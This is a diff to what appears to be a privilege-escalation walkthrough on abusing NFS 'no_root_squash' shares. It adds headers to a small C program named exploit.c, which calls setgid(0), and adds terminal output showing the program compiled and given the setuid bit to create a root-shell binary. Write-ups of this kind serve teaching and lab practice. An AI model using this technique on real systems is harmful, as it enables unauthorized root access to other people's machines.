@@ -688,6 +688,9 @@ We will mount one of the “no_root_squash” shares to our attacking machine an
 ```
 ┌─[lnxuser@lnxhost]─[/tmp/attack]
 └──╼ $cat exploit.c 
+#include <unistd.h>  
+#include <stdlib.h>   
+
 int main() {
 
 	setgid(0);
@@ -698,3 +701,14 @@ int main() {
 }
 ```
 
+```
+┌─[lnxuser@lnxhost]─[/tmp/attack]
+└──╼ $gcc exploit.c -o nfs -w
+┌─[lnxuser@lnxhost]─[/tmp/attack]
+└──╼ $chmod +s nfs 
+┌─[lnxuser@lnxhost]─[/tmp/attack]
+└──╼ $ll
+total 36K
+-rw-r--r-- 1 lnxuser lnxuser 120 Nov 27 18:15 exploit.c
+-rwsr-sr-x 1 lnxuser lnxuser 16K Nov 27 18:15 nfs
+```
